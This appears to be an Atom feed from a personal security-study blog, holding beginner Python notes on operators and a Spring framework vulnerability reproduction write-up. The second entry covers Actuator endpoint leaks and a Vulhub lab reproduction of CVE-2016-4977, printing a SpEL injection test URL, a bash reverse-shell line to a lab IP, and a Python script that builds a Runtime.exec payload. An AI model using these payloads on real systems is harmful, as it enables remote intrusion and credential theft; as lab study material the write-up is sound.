<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://avenue.cool</id>
    <title>凌晨的信息安全之路</title>
    <subtitle>Avenue-le</subtitle>
    <icon>http://avenue.cool/images/favicon.ico</icon>
    <link href="http://avenue.cool" />
    <author>
      <name>Avenue-le</name>
    </author>
    <updated>2021-02-04T15:30:59.000Z</updated>
    <category term="信息安全之路" />
    <category term="随学" />
    <category term="凌晨" />
    <entry>
        <id>http://avenue.cool/Python/Python%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6/</id>
        <title>3.Python进制转换、数据类型详解、类型转换、运算符</title>
        <link rel="alternate" href="http://avenue.cool/Python/Python%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;整数类型操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#整数类型操作&#34;&gt;#&lt;/a&gt; 整数类型操作&lt;/h2&gt;&lt;p&gt;进制&lt;br&gt;现代的计算机和依赖计算机的设备里都用到二进制 (即 0 和 1) 来保存和表示数据，一个二进制表示一个比特 (Bit)。&lt;br&gt;在二进制的基础上，计算机还支持八进制和十六进制这两种进制。&lt;br&gt;除了计算机里的进制以外，我们生活中经常用到的是十进制。&lt;br&gt;Python 语言支持二进制、八进制、十六进制以及十进制的数字表示。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;a = 12 # 默认数字是十进制
print(a + 1)
b = 0b11101   # 以0b开头的数字是二进制
print(b + 1)
c = 0o12  # 以 0o 开头的数字是八进制
print(c + 1)
d = 0x1A  # 以 0x 开头的数字是十六进制
print(d + 1)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进制转换&lt;br&gt;不同进制的数字之间可以通过一定的计算规则相互转换。&lt;/p&gt;&lt;h2 id=&#34;数据类型转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据类型转换&#34;&gt;#&lt;/a&gt; 数据类型转换&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;函数                         说明
int(x [,base ])         将x转换为一个整数
float(x)                将x转换为一个浮点数
str(x)                  将对象 x 转换为字符串
bool(x)                 将对象x转换成为布尔值
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在 python 中，只有空字符串 &#39;&#39;,&amp;quot;&amp;quot;，数字 0, 空字典 {}, 空列表 [], 空元组 (), 和空数据 None 会被转换成为 False, 其他的都会被转换成为 True&lt;/p&gt;&lt;h2 id=&#34;算数运算符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算数运算符&#34;&gt;#&lt;/a&gt; 算数运算符&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;运算符           描述            实例
+               加              两个对象相加 a + b 输出结果 30
-               减              得到负数或是一个数减去另一个数 a - b 输出结果 -10
*               乘              两个数相乘或是返回一个被重复若干次的字符串 a * b 输出结果 200
/               除              b / a 输出结果 2
//              取整            除返回商的整数部分 9//2 输出结果 4 , 9.0//2.0 输出结果 4.0
%               取余            返回除法的余数 b % a 输出结果 0**指数a**b 为10的20次方， 输出结果 100000000000000000000
()              小括号          提高运算优先级，比如: (1+2) * 3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意：混合运算时，优先级顺序为： ** 高于 * / % // 高于 + - ，为了避免歧义，建议使用 () 来处理运算符优先级。 并且，不同类型的数字在进行混合运算时，整数将会转换成浮点数进行运算。&lt;/p&gt;&lt;p&gt;如果是两个字符串做加法运算，会直接把这两个字符串拼接成一个字符串。&lt;br&gt;如果是数字和字符串做乘法运算，会将这个字符串重复多次。&lt;/p&gt;&lt;h2 id=&#34;赋值运算符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#赋值运算符&#34;&gt;#&lt;/a&gt; 赋值运算符&lt;/h2&gt;&lt;p&gt;・复合赋值运算符&lt;br&gt;运算符 描述 实例&lt;br&gt;+= 加法赋值运算符 c += a 等效于 c = c + a&lt;br&gt;-= 减法赋值运算符 c -= a 等效于 c = c - a&lt;br&gt;*= 乘法赋值运算符 c *= a 等效于 c = c * a&lt;br&gt;/= 除法赋值运算符 c /= a 等效于 c = c /a&lt;br&gt;//= 取整除赋值运算符 c //= a 等效于 c = c //a&lt;br&gt;%= 取模赋值运算符 c %= a 等效于 c = c % a&lt;br&gt;**= 幂赋值运算符 c **= a 等效于 c = c ** a&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# 示例：+=
&amp;gt;&amp;gt;&amp;gt; a = 100
&amp;gt;&amp;gt;&amp;gt; a += 1  # 相当于执行 a = a + 1
&amp;gt;&amp;gt;&amp;gt; a
101
# 示例：*=
&amp;gt;&amp;gt;&amp;gt; a = 100
&amp;gt;&amp;gt;&amp;gt; a *= 2  # 相当于执行 a = a * 2
&amp;gt;&amp;gt;&amp;gt; a
200
# 示例：*=，运算时，符号右侧的表达式先计算出结果，再与左边变量的值运算
&amp;gt;&amp;gt;&amp;gt; a = 100
&amp;gt;&amp;gt;&amp;gt; a *= 1 + 2  # 相当于执行 a = a * (1+2)
&amp;gt;&amp;gt;&amp;gt; a
300
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意：赋值运算符是从右往左运算，将等号右边的值赋值给等号左边，所以，等号的左边一定不能是常量或者表达式。&lt;/p&gt;&lt;h2 id=&#34;比较运算符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#比较运算符&#34;&gt;#&lt;/a&gt; 比较运算符&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;以下假设变量a为10，变量b为20：
运算符             描述                                实例
==           等于 - 比较对象是否相等           (a == b) 返回 False.
!=          不等于 - 比较两个对象是否不相等     (a != b) 返回 true.
&amp;lt;&amp;gt;          不等于 - 比较两个对象是否不相等     (a &amp;lt;&amp;gt; b) 返回 true。这个运算符类似 != 。
&amp;gt;           大于 - 返回x是否大于y              (a &amp;gt; b) 返回 False。
&amp;lt;           小于 - 返回x是否小于y。            (a &amp;lt; b) 返回 true。
&amp;gt;=          大于等于 - 返回x是否大于等于y。     (a &amp;gt;= b) 返回 False。
&amp;lt;=          小于等于 - 返回x是否小于等于y。     (a &amp;lt;= b) 返回 true。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果是两个字符串进行比较，会将每个字符都转换成对应的编码，然后逐一进行对比。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;In [1]: str1=&#39;a&#39; 
In [2]: str2=&#39;ABC&#39;
# 将字符转换成为对应的编码  a对应的编码是97,A对应的编码是65
In [3]: str1 &amp;gt; str2
Out[3]: True
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;逻辑运算符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#逻辑运算符&#34;&gt;#&lt;/a&gt; 逻辑运算符&lt;/h2&gt;&lt;p&gt;逻辑运算符&lt;/p&gt;&lt;p&gt;and：&lt;br&gt;x and y：&lt;br&gt;只要有一个运算数是 False，结果就是 False; 只有所有的运算数都为 True 时，结果才是 True。&lt;br&gt;做取值运算时，取第一个为 False 的值，如果所有的值都为 True, 取最后一个值。&lt;br&gt;1 and 0 and 2--&amp;gt; 结果是 0;1 and 2 and 3--&amp;gt; 结果是 3&lt;/p&gt;&lt;p&gt;or：&lt;br&gt;x or y：&lt;br&gt;只要有一个运算数是 True，结果就是 True;&lt;br&gt;只有所有的运算数都为 False 时，结果才是 False&lt;br&gt;做取值运算时，取第一个为 True 的值，如果所有的值都为 False, 取最后一个值。&lt;br&gt;1 or 0 or 2--&amp;gt; 结果是 1;0 or None or () or &#39;&#39; or {} --&amp;gt; 结果是 {}&lt;/p&gt;&lt;p&gt;not：&lt;br&gt;not x：&lt;br&gt;布尔 &amp;quot;非&amp;quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。&lt;br&gt;not (a and b) 返回 False&lt;/p&gt;&lt;h2 id=&#34;运算符优先级&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运算符优先级&#34;&gt;#&lt;/a&gt; 运算符优先级&lt;/h2&gt;&lt;p&gt;当多种运算符做混合运算时，就会涉及到先运算哪个，后运算哪个问题。以下表格列出了从最高到最低优先级的所有运算符：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;**                      指数 (最高优先级)
~ + -                   按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)
* / % //                乘，除，取模和取整除
+ -                     加法减法
&amp;gt;&amp;gt; &amp;lt;&amp;lt;                   右移，左移运算符
&amp;amp;                       位 &#39;AND&#39;
^ |                     位运算符
&amp;lt;= &amp;lt; &amp;gt; &amp;gt;=               比较运算符
&amp;lt;&amp;gt; == !=                等于运算符
=%= /= //= -= += *= **=        赋值运算符
is is not               身份运算符
in not in               成员运算符
not&amp;gt;and&amp;gt;or              逻辑运算符
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;练习：&lt;br&gt;``&lt;br&gt;print(True or False and True)&lt;br&gt;print(False or not False)&lt;br&gt;print(True or True and False)&lt;br&gt;a = 2&lt;br&gt;print(a ** 3 &amp;gt; 5 and a + 2 &amp;gt; 3 or a * 4 + 8 == 16 and not a == True and -a &amp;lt; 0)&lt;/p&gt;&lt;pre&gt;&lt;code&gt;
在以后的实际开发中，如果有多种运算符进行混合运算时，强烈建议使用小括号来手动的控制运算符的优先级！&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2021-02-04T15:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%7Fspring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/</id>
        <title>spring框架漏洞复现集合</title>
        <link rel="alternate" href="http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%7Fspring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和学习整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;框架简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架简介&#34;&gt;#&lt;/a&gt; 框架简介&lt;/h2&gt;&lt;p&gt;Spring 是 Java EE 编程领域的一个轻量级开源框架，该框架由一个叫 Rod Johnson 的程序员在 2002 年最早提出并随后创建，是为了解决企业级编程开发中的复杂性，业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用，实现敏捷开发的应用型框架。框架的主要优势之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为 J2EE 应用程序开发提供集成的框架。&lt;/p&gt;&lt;h2 id=&#34;spring体系结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring体系结构&#34;&gt;#&lt;/a&gt; spring 体系结构&lt;/h2&gt;&lt;p&gt;Spring 框架整体被分为 7 个模块：核心容器 (core container)、 面向切面编程 (aop)、数据访问 (date access)、web 层、test（测试）、消息传输（Messaging）、植入（Instrumentation）模块。&lt;br&gt;Spring4 去掉了 spring3 中的 struts, 添加了 messaging 和 websocket, 其他模块保持不变&lt;br&gt;Spring 的 jar 包大约 20 个，每个都有相应的功能，一个 jar 还可能依赖了若干其他 jar, 所以搞清楚它们之间的关系，配置 maven 依赖就可以简洁明了。&lt;/p&gt;&lt;p&gt;Spring 体系结构如下图：&lt;br&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;h3 id=&#34;core核心容器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#core核心容器&#34;&gt;#&lt;/a&gt; core 核心容器&lt;/h3&gt;&lt;p&gt;core 部分包含 4 个模块：&lt;br&gt;pring-core：提供了框架的基本组成部分，IoC 与 DI 的最基本实现 。&lt;br&gt;spring-beans：提供了 BeanFactory，是工厂模式的一个经典实现，Spring 将管理对象称为 Bean。&lt;br&gt;spring-context：建立在 Core 和 Beans 模块的基础之上，提供一个框架式的对象访问方式，是访问定义和配置的任何对象的媒介。ApplicationContext 接口是 Context 模块的焦点。&lt;br&gt;spring-expression：提供了强大的表达式语言去支持运行时查询和操作对象图。这是对 JSP2.1 规范中规定的统一表达式语言（Unified EL）的扩展。该语言支持设置和获取属性值、属性分配、方法调用、访问数组、集合和索引器的内容、逻辑和算术运算、变量命名以及从 Spring 的 IOC 容器中以名称检索对象。它还支持列表投影、选择以及常用的列表聚合。&lt;/p&gt;&lt;p&gt;IOC:（Inverse of Control 反转控制）控制反转：当一个对象创建时，它所依赖的对象由外部传递给他，而非自己去创建所依赖的对象 (比如通过 new 操作); 将对象的创建权，交由 Spring 完成。&lt;/p&gt;&lt;p&gt;DI: 依赖注入，依赖：一个对象完成业务功能需要依赖另一个对象，比如 service 功能需要依赖于 dao，注入：就是在获取一个对象时，该对象所依赖的实例已经由 spring 替我们分配了。&lt;/p&gt;&lt;p&gt;因为 spring-core 依赖了 commons-logging，而其他模块都依赖了 spring-core，所以整个 spring 框架都依赖了 commons-logging，如果有自己的日志实现如 log4j，可以排除对 commons-logging 的依赖，没有日志实现而排除了 commons-logging 依赖，编译报错&lt;/p&gt;&lt;h3 id=&#34;aop-面向切面编程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aop-面向切面编程&#34;&gt;#&lt;/a&gt; aop 面向切面编程&lt;/h3&gt;&lt;p&gt;aop 部分包含 4 个模块：&lt;br&gt;spring-aop：提供了一个符合 AOP 要求的面向切面的编程实现，允许定义方法拦截器和切入点，将代码按照功能进行分离，以便干净地解耦。&lt;br&gt;spring-aspects：集成 AspectJ&lt;br&gt;spring-instrument：提供一些类级的工具支持和 ClassLoader 级的实现，用于服务器&lt;br&gt;spring-instrument-tomcat：针对 tomcat 的 instrument 实现 (包含了 spring 的 tomcat 设备代理)&lt;/p&gt;&lt;h3 id=&#34;数据访问data-access&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据访问data-access&#34;&gt;#&lt;/a&gt; 数据访问 (data access)&lt;/h3&gt;&lt;p&gt;data access 部分包含 5 个模块：&lt;br&gt;spring-jdbc：jdbc 的支持，提供了一个 JDBC 的抽象层，消除了烦琐的 JDBC 编码和数据库厂商特有的错误代码解析。&lt;br&gt;spring-tx：事务控制，支持用于实现特殊接口和所有 POJO（普通 Java 对象）类的编程和声明式事务管理。&lt;br&gt;spring-orm：为流行的对象关系映射（Object-Relational Mapping）API 提供集成层，包括 JPA 和 Hibernate。使用 Spring-orm 模块可以将这些 O/R 映射框架与 Spring 提供的所有其他功能结合使用，例如声明式事务管理功能。&lt;br&gt;spring-oxm：提供了一个支持对象 / XML 映射的抽象层实现，例如 JAXB、Castor、JiBX 和 XStream。&lt;br&gt;spring-jms：指 Java 消息传递服务，包含用于生产和使用消息的功能。自 Spring4.1 以后，提供了与 Spring-messaging 模块的集成。&lt;/p&gt;&lt;h3 id=&#34;web层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web层&#34;&gt;#&lt;/a&gt; web 层&lt;/h3&gt;&lt;p&gt;web 包含 4 个模块：&lt;br&gt;spring-web：提供了基本的 Web 开发集成功能，例如多文件上传功能、使用 Servlet 监听器初始化一个 IOC 容器以及 Web 应用上下文。&lt;br&gt;spring-webmvc：也称为 Web-Servlet 模块，包含用于 web 应用程序的 Spring MVC 和 REST Web Services 实现。Spring MVC 框架提供了领域模型代码和 Web 表单之间的清晰分离，并与 Spring Framework 的所有其他功能集成。&lt;br&gt;spring-webmvc-portlet：基于 portlet 的 mvc 实现&lt;br&gt;spring-websocket：Spring4.0 以后新增的模块，它提供了 WebSocket 和 SocketJS 的实现，为 web 应用提供的高效通信工具。&lt;/p&gt;&lt;h3 id=&#34;test测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#test测试&#34;&gt;#&lt;/a&gt; test（测试）&lt;/h3&gt;&lt;p&gt;test 部分只有一个模块，我将 spring-context-support 也放在这里&lt;br&gt;spring-test：spring 测试，提供 junit 与 mock 测试功能 0o&lt;br&gt;spring-context-support：spring 额外支持包，比如邮件服务、视图解析等&lt;/p&gt;&lt;h3 id=&#34;消息传输messaging&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#消息传输messaging&#34;&gt;#&lt;/a&gt; 消息传输（Messaging）&lt;/h3&gt;&lt;p&gt;Spring4.0 以后新增了消息（Spring-messaging）模块，该模块提供了对消息传递体系结构和协议的支持。&lt;/p&gt;&lt;h2 id=&#34;框架特征&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架特征&#34;&gt;#&lt;/a&gt; 框架特征&lt;/h2&gt;&lt;p&gt;1、如果 Web 应用程序的 favicon.ico 图标默认没有更改，是一个小绿叶。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/2.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;2、如果 web 应用开发者没有修改 SpringBoot Web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下图：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/3.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;3、根据浏览器的 wappalyzer 插件，识别出 spring 框架。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/4.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;4、根据 F12 查看相应包的内容，有没有关于 spring 的。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/5.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;5、枚举执行器端点路径。这个其实很简单，在确认当前 web 站点是 springboot 框架后，枚举当前站点的所有一级、二级甚至三级目录，然后写脚本对每个目录进行探测，查看目录下是否存在 actuator 执行端点路径即可。&lt;/p&gt;&lt;h2 id=&#34;springboot之actuator配置不当的漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#springboot之actuator配置不当的漏洞利用&#34;&gt;#&lt;/a&gt; Springboot 之 actuator 配置不当的漏洞利用&lt;/h2&gt;&lt;h3 id=&#34;actuator-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#actuator-简介&#34;&gt;#&lt;/a&gt; Actuator 简介&lt;/h3&gt;&lt;p&gt;Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的，然而关于 springboot 框架下 actuator 配置不当的漏洞利用分析文章很少。&lt;/p&gt;&lt;h3 id=&#34;对应路径泄露信息造成的危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#对应路径泄露信息造成的危害&#34;&gt;#&lt;/a&gt; 对应路径泄露信息造成的危害&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;Http 方法	      路径	                描述
get            	/autoconfig       提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过            
get             /configprops      描述配置属性（包含默认值）如何注入 Bean            
get            	/beans            描述应用程序上下文里全部的 Bean，以及它们的关系            
get            	/dump             获取线程活动的快照            
get            	/env              获取全部环境属性            
get            	/env/{name}       根据名称获取特定的环境属性值            
get            	/health           报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供            
get            	/info             获取应用程序的定制信息，这些信息由 info 打头的属性提供            
get            	/mappings         描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系            
get            	/metrics          报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数            
get            	/metrics/{name}   报告指定名称的应用程序度量值            
post            /shutdown         关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）        
get            	/trace            提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）                
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;产生原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#产生原因&#34;&gt;#&lt;/a&gt; 产生原因&lt;/h3&gt;&lt;p&gt;此漏洞是因为开发人员配置不当，将接口暴漏在公网上并且没有配置访问控制权限而产生的信息泄露&lt;/p&gt;&lt;h3 id=&#34;trace-路径下除了记录有基本的-http-请求信息时间戳-http-头等还有用户-token-cookie-字段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#trace-路径下除了记录有基本的-http-请求信息时间戳-http-头等还有用户-token-cookie-字段&#34;&gt;#&lt;/a&gt; ./trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP 头等），还有用户 token、cookie 字段：&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/6.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h3 id=&#34;autoconfig路径下记录哪些自动配置条件通过了哪些没通过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#autoconfig路径下记录哪些自动配置条件通过了哪些没通过&#34;&gt;#&lt;/a&gt; ./autoconfig 路径下，记录哪些自动配置条件通过了，哪些没通过。&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/7.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h3 id=&#34;env路径下这里一般会存放一些环境配置信息如java版本数据账号密码开放端口启动方式等信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#env路径下这里一般会存放一些环境配置信息如java版本数据账号密码开放端口启动方式等信息&#34;&gt;#&lt;/a&gt; ./env 路径下，这里一般会存放一些环境配置信息如 java 版本，数据账号密码，开放端口，启动方式等信息。&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/8.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h3 id=&#34;configprops路径下用来获取应用中配置的属性信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#configprops路径下用来获取应用中配置的属性信息&#34;&gt;#&lt;/a&gt; ./configprops 路径下，用来获取应用中配置的属性信息&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/9.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h3 id=&#34;heapdump-路径下访问heapdump-路径返回-gzip-压缩-hprof-堆转储文件-在-android-studio-打开会泄露站点内存信息很多时候会包含后台用户的账号密码这个就不放图了&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#heapdump-路径下访问heapdump-路径返回-gzip-压缩-hprof-堆转储文件-在-android-studio-打开会泄露站点内存信息很多时候会包含后台用户的账号密码这个就不放图了&#34;&gt;#&lt;/a&gt; ./heapdump 路径下，访问 /heapdump 路径，返回 GZip 压缩 hprof 堆转储文件。在 Android studio 打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码。这个就不放图了&lt;/h3&gt;&lt;h2 id=&#34;spring-security-oauth2-远程命令执行漏洞cve-2016-4977&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-security-oauth2-远程命令执行漏洞cve-2016-4977&#34;&gt;#&lt;/a&gt; Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）&lt;/h2&gt;&lt;h3 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h3&gt;&lt;p&gt;Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了 Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。&lt;/p&gt;&lt;h3 id=&#34;影响范围&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#影响范围&#34;&gt;#&lt;/a&gt; 影响范围&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;Spring Security OAuth 2.0 – 2.0.9
Spring Security OAuth 1.0 – 1.0.5
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;复现过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现过程&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h3&gt;&lt;p&gt;注：本次漏洞复现集合全部采用 Vulhub 环境&lt;/p&gt;&lt;p&gt;执行如下命令启动漏洞环境：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/10.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;验证漏洞是否存在：(用户和密码都是 admin)&lt;/p&gt;&lt;pre&gt;&lt;code&gt;oauth/authorize?response_type=${2*2}&amp;amp;client_id=acme&amp;amp;scope=openid&amp;amp;redirect_uri=http://test   返回其中计算的值
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/11.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;对反弹 shell 的 POC 进行 base64 编码（java 反弹 shell 都需要先编码，不然不会成功，runtime 不支持管道符）&lt;br&gt;加密地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=&#34;&gt;http://www.jackson-t.ca/runtime-exec-payloads.html&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.105/6666 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/12.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;在用 POC 生成一个脚本代码&lt;br&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/13.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;POC 脚本：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python

message = input(&#39;Enter message to encode:&#39;)

poc = &#39;${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])

for ch in message[1:]:
   poc += &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch)

poc += &#39;)}&#39;

print(poc)
